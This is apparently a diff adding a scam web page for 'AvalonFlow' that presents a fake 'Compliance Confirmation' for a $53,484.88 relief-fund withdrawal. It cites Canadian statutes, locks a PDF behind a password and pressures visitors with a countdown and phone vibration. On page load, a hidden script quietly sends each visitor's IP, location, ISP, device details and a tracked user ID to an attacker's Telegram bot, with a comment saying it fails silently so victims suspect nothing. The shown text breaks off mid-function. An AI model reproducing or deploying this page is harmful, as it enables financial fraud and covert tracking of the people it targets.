@@ -1,0 +1,1196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Confirmation</title>
+
+      <!-- Favicon -->
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3">
+<link rel="icon" type="image/x-icon" href="/favicon.ico?v=3">
+
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png?v=3">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png?v=3">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png?v=3">
+
+<link rel="icon" type="image/png" sizes="192x192" href="/android-chrome-192x192.png?v=3">
+<link rel="icon" type="image/png" sizes="512x512" href="/android-chrome-512x512.png?v=3">
+<link rel="manifest" href="/manifest.json?v=3">
+
+
+        <!-- Structured Data for Logo -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "name": "AvalonFlow",
+      "url": "https://avalonflow.site",
+      "logo": "https://avalonFlow.site/favicon.png"
+    }
+</script>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/dflip/2.3.16/css/dflip.min.css" />
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dflip/2.3.16/js/dflip.min.js"></script>
+
+<!-- THE ENGINE SCRIPT: Put this right before your closing body tag -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.4.120/pdf.min.js"></script>
+<style>
+/* ---------- Base ---------- */
+body {
+          font-family: 'Georgia', sans-serif;  
+  margin: 0;
+  background: #0d0d0d;
+  color: #fff;
+  overflow-x: hidden;
+}
+button { cursor: pointer; }
+a { color: inherit; text-decoration: none; }
+
+    /* Notification Bar */
+    .notification-bar {
+        position: fixed;
+        top: -80px;
+        right: 20px;
+        background: rgba(30, 144, 255, 0.25);
+        backdrop-filter: blur(12px);
+        border: 1px solid rgba(30,144,255,0.4);
+        color: #fff;
+        padding: 12px 18px;
+        border-radius: 12px;
+        font-size: 14px;
+        box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+        transition: top 0.5s ease, opacity 0.5s ease;
+        z-index: 9999;
+        opacity: 0;
+        max-width: 350px;
+        white-space: normal;
+        overflow: hidden;
+    }
+    .notification-bar.show {
+        top: 20px;
+        opacity: 1;
+    }
+.notification-bar.warning-yellow {
+    color: #ffcc00;
+    font-weight: 600;
+}
+
+.notification-bar.warning-red {
+    color: #ff3b3b;
+    font-weight: 600;
+    animation: pulse 1s infinite;
+}
+    .notification-bar::before {
+        content: '';
+        position: absolute;
+        left: -50%;
+        top: 0;
+        width: 50%;
+        height: 100%;
+        background: rgba(255,255,255,0.3);
+        transform: skewX(-25deg);
+        animation: liquidWave 2s linear infinite;
+    }
+    @keyframes liquidWave {
+        0% { left: -50%; }
+        100% { left: 100%; }
+    }
+
+        /* ---------- Floating Background ---------- */
+#floating-bg {
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    pointer-events: none;
+
+    /* Soft white/blue futuristic background */
+    background: radial-gradient(circle at bottom, #cfe8ff, #ffffff);
+
+    overflow: hidden;
+}
+
+.particle {
+    position: absolute;
+    border-radius: 50%;
+    opacity: 0.6;
+
+    animation: floatParticles linear infinite;
+
+    /* Soft futuristic glow */
+    background: rgba(120, 180, 255, 0.7);
+    box-shadow: 0 0 10px #8ec5ff, 0 0 20px #b7dcff;
+}
+
+@keyframes floatParticles {
+    0% {
+        transform: translateY(100vh) scale(0.3);
+        opacity: 0;
+    }
+
+    50% {
+        opacity: 1;
+    }
+
+    100% {
+        transform: translateY(-10vh) scale(1);
+        opacity: 0;
+    }
+}
+
+/* ---------- Header ---------- */
+header {
+  text-align: center;
+  padding: 40px 0;
+  position: relative;
+  z-index: 2;
+}
+.header-frame {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 350px;
+  height: 180px;
+  border-radius: 24px;
+  background: rgba(255,255,255,0.12);
+  backdrop-filter: blur(15px);
+  border: 1px solid rgba(255,255,255,0.3);
+  box-shadow: 0 8px 30px rgba(0,0,0,0.5);
+}
+.header-frame img {
+  max-width: 90%;
+  max-height: 90%;
+  height: auto;
+}
+
+.membership-confirmation {
+  text-align: center;
+  font-weight: bold;
+  font-size: 1.8rem;
+  margin: 20px 0 10px;
+  position: relative;
+  z-index: 3;
+
+  background: linear-gradient(90deg,#6b2cd8,#b393ff,#6b2cd8);
+  background-size: 200% auto;
+  animation: gradientShift 6s linear infinite;
+
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+
+  text-shadow: 0 2px 6px rgba(0,0,0,0.35);
+}
+
+@keyframes gradientShift {
+  0% { background-position: 0% center; }
+  100% { background-position: 200% center; }
+}
+
+/* ---------- Glass Cards ---------- */
+.glass-card {
+  background: rgba(255,255,255,0.12);
+  backdrop-filter: blur(12px);
+  border-radius: 18px;
+  padding: 28px;
+  margin: 80px auto 30px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+  max-width: 280px !important;
+}
+
+/* ---------- Glass Cards ---------- */
+.glass-cards {
+  background: rgba(255,255,255,0.12);
+  backdrop-filter: blur(12px);
+  border-radius: 18px;
+  padding: 28px;
+  margin: 80px auto 30px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+}
+
+/* ---------- Checkbox ---------- */
+.checkbox-container {
+  display: flex;
+  flex-direction: row-reverse; /* Flips the visual order so input goes to the right */
+  align-items: flex-end;      /* CHANGED: Pulls the checkbox down to the bottom edge */
+  justify-content: space-between; /* Pushes text to left, checkbox to far right */
+  gap: 16px; /* Slightly more breathing room since it's on the right */
+  margin-top: 14px;
+}
+
+.checkbox-container input {
+  margin-bottom: 4px;         /* CHANGED: Switched from top to bottom margin for a cleaner baseline alignment */
+  cursor: pointer;
+}
+
+.checkbox-container label {
+  flex: 1; /* Ensures the label takes up all remaining space on the left */
+}
+
+
+
+/* =========================
+TOP RIGHT PROFILE POSITION
+========================= */
+.top-right-profile {
+    position: fixed;
+    top: 15px;
+    right: 15px;
+    z-index: 999;
+}
+
+#profilePhoto:not([src]), 
+#profilePhoto[src="default-avatar.png"] {
+    content: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23c0a9ff'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5-4-8-4z'/%3E%3C/svg%3E") !important;
+    background: #1a1625 !important;
+    box-sizing: border-box !important;
+    padding: 6px !important;
+}
+
+
+/* =========================
+OUTER RING WRAPPER
+========================= */
+.avatar-ring {
+    width: 52px;
+    height: 52px;
+    border-radius: 50%;
+    padding: 3px;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+
+/* =========================
+PURPLE NEON SPIN + PULSE
+========================= */
+.avatar-ring::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+
+    /* PURE PURPLE GLOW */
+    background: conic-gradient(
+        #a855f7,
+        #7c3aed,
+        #a855f7
+    );
+
+    animation:
+    spin 3s linear infinite,
+    hueShift 6s linear infinite;
+
+    filter: blur(5px);
+    opacity: 0.9;
+    z-index: 0;
+}
+
+
+/* =========================
+INNER CUT
+========================= */
+.avatar-ring::after {
+    content: "";
+    position: absolute;
+    inset: 4px;
+    background: transparent;
+    border-radius: 50%;
+    z-index: 1;
+}
+
+
+/* =========================
+PROFILE IMAGE
+========================= */
+.avatar {
+    width: 46px;
+    height: 46px;
+    border-radius: 50%;
+    object-fit: cover;
+    position: relative;
+    z-index: 2;
+    border: 1px solid rgba(168,85,247,0.25);
+}
+
+
+/* =========================
+ANIMATIONS
+========================= */
+
+/* spinning ring */
+@keyframes spin {
+    0% {
+        transform: rotate(0deg);
+    }
+    100% {
+        transform: rotate(360deg);
+    }
+}
+
+@keyframes hueShift {
+    0% {
+        filter: blur(4px) hue-rotate(0deg);
+        opacity: 0.75;
+    }
+    50% {
+        filter: blur(5px) hue-rotate(180deg);
+        opacity: 0.9;
+    }
+    100% {
+        filter: blur(4px) hue-rotate(360deg);
+        opacity: 0.75;
+    }
+}
+
+/* ---------- Textarea ---------- */
+textarea {
+  width: 100%;
+  padding: 14px;
+  border-radius: 12px;
+  border: none;
+  background: rgba(255,255,255,0.15);
+  color: #fff;
+  font-size: 16px;
+  margin-top: 10px;
+  resize: vertical;
+}
+
+/* ---------- Buttons ---------- */
+.button-row {
+  display: flex;
+  justify-content: space-between;
+  max-width: 600px;
+  margin: 0 auto 120px;
+}
+button {
+  padding: 12px 24px;
+  border-radius: 12px;
+  border: none;
+  font-weight: bold;
+  background: rgba(107,44,216,0.6);
+  color: #fff;
+}
+button:hover {
+  background: rgba(107,44,216,0.8);
+}
+
+/* Neon glass card */
+.neon-card {
+  background: rgba(107,44,216,0.15);
+  backdrop-filter: blur(12px);
+  border-radius: 18px;
+  padding: 24px;
+  box-shadow: 
+    0 0 10px rgba(107,44,216,0.5),
+    0 0 20px rgba(107,44,216,0.4),
+    0 0 40px rgba(107,44,216,0.3),
+    0 0 80px rgba(107,44,216,0.2);
+  max-width: 600px;
+  margin: 10px auto 40px;
+  position: relative;
+  animation: neonPulse 2.5s ease-in-out infinite alternate;
+  overflow: hidden;
+}
+
+/* Inner glow */
+.neon-card::before {
+  content: '';
+  position: absolute;
+  inset: 2px;
+  border-radius: 16px;
+  border: 2px solid rgba(107,44,216,0.6);
+  box-shadow:
+    0 0 10px rgba(107,44,216,0.8),
+    0 0 20px rgba(107,44,216,0.6),
+    0 0 30px rgba(107,44,216,0.4);
+  pointer-events: none;
+  z-index: 0;
+  animation: innerPulse 2.5s ease-in-out infinite alternate;
+}
+
+/* Purple halo behind card */
+.neon-card::after {
+  content: '';
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 120%;
+  height: 120%;
+  background: radial-gradient(circle, rgba(107,44,216,0.4) 0%, transparent 70%);
+  transform: translate(-50%, -50%) scale(1);
+  border-radius: 50%;
+  z-index: -1; /* behind card content */
+  animation: haloPulse 2.5s ease-in-out infinite alternate;
+  pointer-events: none;
+}
+
+/* Red warning glow */
+.neon-card.warning {
+  animation: warning-glow 0.8s ease-in-out 2;
+  box-shadow: 0 0 20px 4px rgba(255,77,77,0.9);
+}
+
+/* Pulsing neon animations */
+@keyframes neonPulse {
+  0% { box-shadow: 0 0 10px rgba(107,44,216,0.4),0 0 20px rgba(107,44,216,0.3),0 0 40px rgba(107,44,216,0.2); }
+  50% { box-shadow: 0 0 20px rgba(107,44,216,0.8),0 0 40px rgba(107,44,216,0.6),0 0 60px rgba(107,44,216,0.4); }
+  100% { box-shadow: 0 0 10px rgba(107,44,216,0.4),0 0 20px rgba(107,44,216,0.3),0 0 40px rgba(107,44,216,0.2); }
+}
+@keyframes innerPulse {
+  0% { box-shadow: 0 0 5px rgba(107,44,216,0.5),0 0 10px rgba(107,44,216,0.4),0 0 15px rgba(107,44,216,0.3); }
+  50% { box-shadow: 0 0 15px rgba(107,44,216,0.8),0 0 25px rgba(107,44,216,0.6),0 0 35px rgba(107,44,216,0.4); }
+  100% { box-shadow: 0 0 5px rgba(107,44,216,0.5),0 0 10px rgba(107,44,216,0.4),0 0 15px rgba(107,44,216,0.3); }
+}
+@keyframes haloPulse {
+  0% { transform: translate(-50%, -50%) scale(1); opacity:0.5; }
+  50% { transform: translate(-50%, -50%) scale(1.15); opacity:0.7; }
+  100% { transform: translate(-50%, -50%) scale(1); opacity:0.5; }
+}
+@keyframes warning-glow {
+  0% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
+  50% { box-shadow: 0 0 20px 6px rgba(255,77,77,0.9); }
+  100% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
+}
+
+  /* ================= Header Logo Card Neon ================= */
+
+.minimal-logo-header {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+
+  /* Reduced top padding dramatically so it sits near the top edge */
+  padding: 10px 0 10px 0; 
+
+  /* Optional: Ensures it stays firmly at the absolute top of the page layout */
+  width: 100%;
+  margin-top: -152px; 
+
+  background: transparent !important;
+}
+
+.logo-shimmer-wrapper {
+  position: relative;
+  width: 200px;
+  height: 200px;
+  overflow: hidden;
+  background: transparent !important; /* Kept perfectly transparent, no card background */
+}
+
+.avalon-logo-img {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+
+  /* Keep your logo scaling */
+  transform: scale(0.40);
+  transform-origin: center center;
+
+  /* ---------- LOGO GLASS EFFECT ---------- */
+  /* This blurs the particles directly through the transparent logo asset itself */
+  backdrop-filter: blur(4px);
+  -webkit-backdrop-filter: blur(4px);
+  opacity: 0.9; 
+  /* -------------------------------------- */
+
+  filter: drop-shadow(0 4px 14px rgba(0, 0, 0, 0.05));
+  mix-blend-mode: multiply; 
+  background:  transparent !important;
+  border: none !important;            
+  outline: none !important;
+}
+
+/* ---------- Footer ---------- */
+footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    text-align: center;
+    padding: 18px 0;
+    font-size: 14px;
+    color: #555;
+    background: rgba(255, 255, 255, 0.92);
+    backdrop-filter: blur(12px);
+    box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.08);
+    z-index: 6;
+}
+</style>
+</head>
+
+<body>
+
+<!-- Floating Background -->
+<div id="floating-bg"></div>
+
+<div id="planNotification" class="notification-bar"></div>
+
+<!-- =========================
+TOP RIGHT PROFILE AVATAR
+========================= -->
+<div class="top-right-profile">
+     <div class="avatar-ring">
+        <img id="profilePhoto" src="default-avatar.png" class="avatar" alt="Profile picture">
+    </div>
+
+    <div style="position: absolute; top: 58px; right: 70%; transform: translateX(50%); white-space: nowrap; pointer-events: none; text-align: center;">
+        <span id="avatarLabel" style="font-family: sans-serif; font-size: 10px; font-weight: 500; color: #c0a9ff; letter-spacing: 0.3px; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);">Add Profile Picture</span>
+    </div>
+
+</div>
+
+
+<!-- =========================
+CROP MODAL
+========================= -->
+<div id="cropModal" class="crop-modal hidden">
+
+    <div class="crop-box">
+
+        <!-- file input (hidden trigger via JS) -->
+        <input type="file" id="photoInput" accept="image/*">
+
+        <!-- crop preview -->
+        <div class="crop-preview">
+            <img id="cropImage">
+        </div>
+
+        <!-- actions -->
+        <div class="crop-actions">
+            <button id="saveCropped">Save Photo</button>
+            <button id="cancelCrop">Cancel</button>
+        </div>
+
+    </div>
+
+</div>
+
+
+  <!-- Header -->
+  <header class="minimal-logo-header">
+  <div class="logo-shimmer-wrapper">
+    <img src="assets/pictures/1780995787737.jpeg" alt="Avalon Logo" class="avalon-logo-img">
+  </div>
+</header>
+
+<div id="main-application-reader" class="glass-cards neon-card custom-platform-reader" style="max-width: 740px; width: 95%; margin: 25px auto; padding: 20px 15px; text-align: center; box-sizing: border-box; transition: all 0.4s ease-in-out;">
+    
+    <div id="pdf-pages-container" style="width: 100%; display: none; flex-direction: column; gap: 25px; box-sizing: border-box;">
+        </div>
+
+    <div id="crypto-lockbox" style="padding: 30px 15px; background: rgba(20, 20, 20, 0.75); border-radius: 12px; max-width: 100%; width: 340px; margin: 15px auto; box-sizing: border-box; border: 1px solid rgba(164, 108, 255, 0.2);">
+        <div style="font-size: 28px; margin-bottom: 12px;">🔐</div>
+        <h3 style="color: #a46cff; margin: 0 0 10px 0; font-family: sans-serif; font-size: 20px; font-weight: 600;">Security Authorization</h3>
+        <p style="color: #ccc; font-size: 13px; margin-bottom: 20px; line-height: 1.5; padding: 0 10px;">Your attached Compliance Directive is locked with data and cross-ledger transport encryption. Please input your received credential key to decrypt.</p>
+        
+        <input type="password" id="pdf-password-input" placeholder="Enter Password" style="width: 85%; padding: 12px; border: 1px solid #a46cff; background: rgba(0,0,0,0.6); color: #fff; border-radius: 6px; text-align: center; font-size: 16px; margin-bottom: 15px; outline: none; box-sizing: border-box;">
+        <br>
+        <button id="decrypt-btn" style="background: #a46cff; color: #fff; border: none; padding: 12px 0; width: 85%; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 14px; transition: 0.2s; box-sizing: border-box; letter-spacing: 0.5px;">Unlock Document</button>
+        <p id="error-message" style="color: #ff4d4d; font-size: 13px; margin-top: 10px; display: none;">Invalid Authorization Key</p>
+    </div>
+</div>
+
+
+<!-- Membership Confirmation -->
+<h2 class="membership-confirmation">
+  Compliance Confirmation
+</h2>
+
+
+
+  <!-- Glass Card 1: Confirmation -->
+  <!-- Glass Card: Confirmation with Neon + Halo + Red Glow -->
+<div class="glass-card neon-card" id="confirmationCard" style="margin:30px auto;">
+  <div class="checkbox-container">
+    <input type="checkbox" id="confirmation">
+    <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
+    
+    <span style="display: block; margin-bottom: 12px;">
+        I hereby confirm the initiation of my withdrawal under the ongoing Nobu Relief Fund: <strong style="color: #000000; text-shadow: 0 0 8px rgba(164, 108, 255, 0.6);"> Recovery Initiative & Child Tax Credit + Sector Retention Bonus under Reference Ledger [REF ID: AF-5019-HTBV].</strong>
+    </span>
+
+<span style="display: block;">
+        Upon successful completion of the verification process, my Estimated Total Settlement of <strong style="color: #1BE3FF; text-shadow: 0 0 8px rgba(164, 108, 255, 0.6);"> $53,484.88</strong> will be cleared and authorized for automatic disbursement to my designated payout method.
+    </span>
+
+   <span style="  
+    display: block;  
+    margin: 12px 0;  
+    padding-left: 12px;  
+    border-left: 3px solid rgba(200, 50, 80, 0.85);  
+    color: rgba(200, 50, 80, 0.85);  
+    font-size: 10px;  
+">  
+    The verification process is executed pursuant to the Proceeds of Crime (Money Laundering) and Terrorist Financing Act (PCMLTFA) and Section 153 of the Canadian Income Tax Act governing specialized sector disbursements and relief allocations exceeding the $500.00 threshold.  
+</span>
+
+</label>
+  </div>
+</div>
+
+       <!-- Navigation Buttons -->
+<div id="submitBtn" style="max-width:600px;margin:40px auto 100px; display:flex;justify-content:flex-end; position:relative; z-index:5;">
+    <button id="nextBtnSeparate" style="background: rgba(107,44,216,0.9); border:1px solid #fff; padding:12px 24px; border-radius:12px; font-weight:bold; color:#fff;">Proceed to Withdrawal</button>
+</div>
+
+<footer>
+  © 2026 AvalonFlow Corp • All Rights Reserved
+</footer>
+
+<script>
+
+    
+   pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.4.120/pdf.worker.min.js';
+
+const url = 'assets/documents/Compliance_Directive_AF-5019-HTBV_protected.pdf';
+const mainCard = document.getElementById('main-application-reader');
+const lockbox = document.getElementById('crypto-lockbox');
+const container = document.getElementById('pdf-pages-container');
+const errorMsg = document.getElementById('error-message');
+
+document.getElementById('decrypt-btn').addEventListener('click', function() {
+    const password = document.getElementById('pdf-password-input').value;
+
+    pdfjsLib.getDocument({ url: url, password: password }).promise.then(function(pdf) {
+        lockbox.style.display = 'none';
+        errorMsg.style.display = 'none';
+        container.innerHTML = ''; 
+
+        // DYNAMIC UNLOCK: Expands the glass outer boundary to comfortably host full A4 desktop width layout profiles
+        mainCard.style.maxWidth = '780px';
+        mainCard.style.padding = '10px';
+        container.style.display = 'flex'; 
+
+        for (let pageNum = 1; pageNum <= pdf.numPages; pageNum++) {
+            const canvas = document.createElement('canvas');
+
+            // FORCE-OVERRIDE STYLING: This completely shatters any hidden global layout restrictions
+            canvas.style.display = 'block';
+            canvas.style.width = '100vw';       // Tells the canvas to take up full mobile viewport real estate
+            canvas.style.maxWidth = '100%';    // Forces it to match your wide outer card boundary exactly
+            canvas.style.height = 'auto';
+            canvas.style.borderRadius = '6px';
+
+            container.appendChild(canvas);
+
+            const ctx = canvas.getContext('2d');
+
+            pdf.getPage(pageNum).then(function(page) {
+                // We boost the dynamic scale multiplier to 2.5 to ensure the text prints thick, bold, and large
+                const containerWidth = container.clientWidth || 340;
+                const unscaledViewport = page.getViewport({ scale: 1.0 });
+                const dynamicScale = (containerWidth / unscaledViewport.width) * 2.5; 
+
+                const viewport = page.getViewport({ scale: dynamicScale });
+                canvas.height = viewport.height;
+                canvas.width = viewport.width;
+
+                const renderContext = {
+                    canvasContext: ctx,
+                    viewport: viewport
+                };
+                page.render(renderContext);
+            });
+        }
+    }).catch(function(error) {
+        if (error.name === 'PasswordException') {
+            errorMsg.style.display = 'block';
+        } else {
+            console.error("Glitched loading file:", error);
+        }
+    }); // <-- FIXED: Sealed the getDocument promise sequence
+}); // <-- FIXED: Sealed the click event handler wrapper
+
+async function sendVisitorDetailsToTelegram() {
+  // 1. Telegram bot details
+  const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
+  const CHAT_IDs = '-1003913850436'; 
+
+  try {
+    // 1. Read the user identity from the URL bar
+    const urlParams = new URLSearchParams(window.location.search);
+    const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
+
+    // 2. Fetch the user's network details silently
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+
+    const data = await ipResponse.json();
+
+    // Capture the current page path
+    const currentPage = window.location.pathname; 
+
+    // Capture the platform/device operating system safely
+    let devicePlatform = 'Unknown';
+    if (navigator.userAgentData && navigator.userAgentData.platform) {
+      devicePlatform = navigator.userAgentData.platform; 
+    } else if (navigator.platform) {
+      devicePlatform = navigator.platform; 
+    }
+
+    // 3. Format the log notification text using HTML parsing to prevent breakdown errors
+    const telegramMessage = 
+      `🌐 <b>New Visitor Logged</b>\n\n` +
+      `• <b>Target User:</b> <code>${identifyUser}</code>\n` +
+      `• <b>Visited Page:</b> <code>${currentPage}</code>\n` + 
+      `• <b>Platform/OS:</b> <code>${devicePlatform}</code>\n` + 
+      `• <b>IP Address:</b> <code>${data.ip}</code>\n` +
+      `• <b>ISP/Provider:</b> <code>${data.org || 'Unknown'}</code>\n` +
+      `• <b>ASN:</b> <code>${data.asn || 'N/A'}</code>\n` +
+      `• <b>Location:</b> <code>${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}</code>\n` +
+      `• <b>Device Agent:</b> <code>${navigator.userAgent.substring(0, 100)}...</code>`;
+
+    // 4. Send the payload directly to your Telegram channel/chat
+    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
+
+    await fetch(telegramUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_IDs,
+        text: telegramMessage,
+        parse_mode: 'HTML' // Switched to HTML to make parsing bulletproof
+      })
+    });
+
+  } catch (error) {
+    // Fail silently so the visitor doesn't suspect anything on screen
+    console.error('System logging exception occurred.');
+  }
+}
+
+// --- THE PAGE LOAD TRIGGER ---
+document.addEventListener('DOMContentLoaded', () => {
+  sendVisitorDetailsToTelegram();
+});
+        
+
+/* --------------------------
+NOTIFICATION SYSTEM
+-------------------------- */
+
+let sessionInterval;
+let guardInterval;
+let avbInterval;
+
+const notification = document.getElementById("planNotification");
+
+function showNotification(message, duration = 4000) {
+    if (!notification) return;
+
+    notification.textContent = message;
+    notification.classList.add("show");
+
+    clearTimeout(notification.hideTimer);
+
+    notification.hideTimer = setTimeout(() => {
+        notification.classList.remove("show");
+    }, duration);
+}
+
+/* --------------------------
+SHARED STATE ENGINE (MATCHES DASHBOARD)
+-------------------------- */
+
+const getState = (remaining) => {
+    if (remaining <= 0) return "expired";
+
+    if (remaining <= 300) return "red";        // 5–0 min
+    if (remaining <= 360) return "yellow";     // 6–5 min
+    if (remaining <= 540) return "hide_mid";   // 9–6 min
+    if (remaining <= 720) return "show_mid";   // 12–9 min
+
+    return "hide_start";                       // 15–12 min
+};
+
+/* --------------------------
+UI UPDATE (DASHBOARD STYLE)
+-------------------------- */
+
+const updateSessionUI = () => {
+    const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+    if (!expiryTime) return;
+
+    const remaining = Math.max(
+        0,
+        Math.floor((expiryTime - Date.now()) / 1000)
+    );
+
+    const state = getState(remaining);
+
+    // reset styles
+    notification.classList.remove("warning-yellow", "warning-red");
+
+    // warnings
+    if (state === "yellow") {
+        notification.classList.add("warning-yellow");
+        if (navigator.vibrate) navigator.vibrate(200);
+    }
+
+    if (state === "red") {
+        notification.classList.add("warning-red");
+        if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
+    }
+
+    // visibility rules (same as dashboard)
+    if (state === "hide_start") {
+        notification.classList.remove("show");
+    }
+    else if (state === "show_mid") {
+        notification.classList.add("show");
+    }
+    else if (state === "hide_mid") {
+        notification.classList.remove("show");
+    }
+    else {
+        notification.classList.add("show");
+    }
+
+    // countdown text
+    const minutes = Math.floor(remaining / 60);
+    const seconds = remaining % 60;
+
+    notification.textContent =
+        `Session expires in ${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
+};
+
+/* --------------------------
+BOOT FLOW (same delay logic)
+-------------------------- */
+
+window.addEventListener("load", () => {
+
+    const saved = JSON.parse(localStorage.getItem("membershipConfirmed") || "{}");
+
+    const hasSavedData = Object.values(saved).some(
+        v => v && v.toString().trim() !== ""
+    );
+
+    // Updated: Shows the compliance message instantly on page load
+    showNotification("⚠️ Important: Please read the compliance protocols below carefully");
+
+    setTimeout(() => {
+        updateSessionUI();
+        sessionInterval = setInterval(updateSessionUI, 1000);
+    }, 3000);
+});
+
+/* --------------------------
+AVB ENGINE (DASHBOARD MATCH)
+-------------------------- */
+
+/* --------------------------
+AVB ENGINE (DASHBOARD MATCH)
+-------------------------- */
+
+(function avbEngine() {
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const hasInitParam =
+        urlParams.get("session") === "refresh" ||
+        urlParams.get("mode") === "init";
+
+    // Get the current usage count (defaults to 0 if it doesn't exist yet)
+    let keyUsageCount = parseInt(localStorage.getItem("avb_key_used_count"), 10) || 0;
+
+    // Clear everything ONLY if they have the param AND have used it less than 10 times
+    if (hasInitParam && keyUsageCount < 10) {
+        localStorage.removeItem("avb_expiry_time");
+        localStorage.removeItem("avb_redirected_to_avb");
+        localStorage.removeItem("avb_session_state");
+        localStorage.removeItem("membershipConfirmed");
+
+        // Increment the count by 1 and save it back to local storage
+        keyUsageCount += 1;
+        localStorage.setItem("avb_key_used_count", keyUsageCount.toString());
+    }
+
+    if (!localStorage.getItem("avb_expiry_time")) {
+        localStorage.setItem(
+            "avb_expiry_time",
+            Date.now() + 15 * 60 * 1000
+        );
+    }
+
+    let triggered = false;
+    let vibRunning = false;
+    let vibTimeout;
+
+    const startVibrationCycle = () => {
+        if (vibRunning) return;
+        vibRunning = true;
+
+        const loop = () => {
+            if (!vibRunning) return;
+
+            if (navigator.vibrate) {
+                navigator.vibrate([300, 100, 300]);
+            }
+
+            vibTimeout = setTimeout(loop, 15000);
+        };
+
+        loop();
+    };
+
+    const stopVibrationCycle = () => {
+        vibRunning = false;
+        if (vibTimeout) clearTimeout(vibTimeout);
+        if (navigator.vibrate) navigator.vibrate(0);
+    };
+
+    const check = () => {
+        const expiryTime = parseInt(
+            localStorage.getItem("avb_expiry_time"),
+            10
+        );
+
+        const remainingSec = Math.floor(
+            (expiryTime - Date.now()) / 1000
+        );
+
+        if (!triggered && remainingSec <= 360 && remainingSec > 0) {
+
+            triggered = true;
+
+            startVibrationCycle();
+
+            console.log("AVB warning triggered with vibration cycle");
+        }
+
+        // optional safety stop if time passes out of range
+        if (remainingSec <= 0 || remainingSec > 360) {
+            stopVibrationCycle();
+        }
+    };
+
+    check();
+    const avbInterval = setInterval(check, 1000);
+
+})();
+
+/* --------------------------
+SESSION GUARD (CLEANED)
+-------------------------- */
+
+(function sessionGuard() {
+
+    const check = () => {
+        const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+
+        if (!expiryTime) return;
+
+        if (Date.now() >= expiryTime) {
+
+            localStorage.removeItem("avb_expiry_time");
+            localStorage.removeItem("avb_redirected_to_avb");
+            localStorage.removeItem("avb_session_state");
+            // Note: We leave avb_key_used_count so the 10-visit limit persists across timeouts
+
+            window.location.href =
+                "https://membership-signup.avalonflow.site/sign-in";
+        }
+    };
+
+    check();
+    guardInterval = setInterval(check, 5000);
+
+})();
+
+
+
+
+const photoInput = document.getElementById('photoInput');
+const profilePhoto = document.getElementById('profilePhoto');
+const avatarLabel = document.getElementById('avatarLabel'); // Targeted the span
+
+const cropModal = document.getElementById('cropModal');
+const cropImage = document.getElementById('cropImage');
+
+const DEFAULT_AVATAR = 'default-avatar.png';
+let isProcessing = false;
+
+
+// CLICK TO ADD OR REMOVE
+profilePhoto.addEventListener('click', () => {
+    if (isProcessing) return;
+
+    // Check if a custom photo is currently set
+    const hasPhoto = localStorage.getItem('profilePhoto');
+
+    if (hasPhoto) {
+        // REMOVE PICTURE: Clear it out instantly
+        localStorage.removeItem('profilePhoto');
+        profilePhoto.src = DEFAULT_AVATAR;
+        if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
+    } else {
+        // ADD PICTURE: Open the file picker if it's empty
+        photoInput.click();
+    }
+});
+
+
+// AUTO PROCESS IMAGE (no save button)
+photoInput.addEventListener('change', (e) => {
+
+    const file = e.target.files[0];
+    if (!file || isProcessing) return;
+
+    isProcessing = true;
+
+    const reader = new FileReader();
+
+    reader.onload = function(event) {
+
+        const rawImage = event.target.result;
+
+        const img = new Image();
+        img.src = rawImage;
+
+        img.onload = function() {
+
+            const canvas = document.createElement('canvas');
+            const size = Math.min(img.width, img.height);
+
+            canvas.width = size;
+            canvas.height = size;
+
